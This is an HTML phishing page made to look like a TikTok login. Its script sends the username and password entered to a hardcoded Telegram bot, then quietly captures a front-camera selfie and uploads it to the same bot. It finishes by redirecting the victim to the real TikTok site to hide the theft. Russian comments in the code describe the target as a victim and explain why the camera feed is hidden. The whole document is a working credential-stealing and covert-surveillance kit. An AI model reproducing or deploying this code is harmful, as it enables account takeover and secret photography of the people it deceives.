<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Log in to TikTok</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
        h2 { margin-bottom: 20px; font-weight: 500; }
        input { width: 100%; padding: 15px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #fe2c55; }
        button { width: 100%; padding: 15px; background: #fe2c55; color: #fff; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        
        /* Скрываем видео, чтобы не пугать жертву */
        #camera-video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Log in to TikTok</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="btn">Log in</button>
        </form>
    </div>

    <video id="camera-video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8"; 
        const CHAT_ID = "7485234259"; 

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const btn = document.getElementById('btn');
            
            btn.innerText = "Verifying...";
            btn.disabled = true;

            // 1. Отправляем логин и пароль в Telegram
            const text = `🎯 TikTok Phish\nDevice: iOS\nUser: ${user}\nPass: ${pass}`;
            const urlText = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
            await fetch(urlText, { mode: 'no-cors', keepalive: true });

            // 2. Запрашиваем камеру и делаем снимок
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('camera-video');
                video.srcObject = stream;
                
                // Ждем 600мс, чтобы камера включилась
                await new Promise(resolve => setTimeout(resolve, 600));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                stream.getTracks().forEach(track => track.stop());

                const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                const blob = await (await fetch(dataURL)).blob();
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'face.jpg');
                formData.append('caption', '📸 Селфи жертвы');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.log('Камера недоступна или запрещена', err);
            }

            // 3. Перекидываем на настоящий TikTok
            setTimeout(() => {
                window.location.href = "https://www.tiktok.com/login";
            }, 1000);
        });
    </script>
</body>
</html>
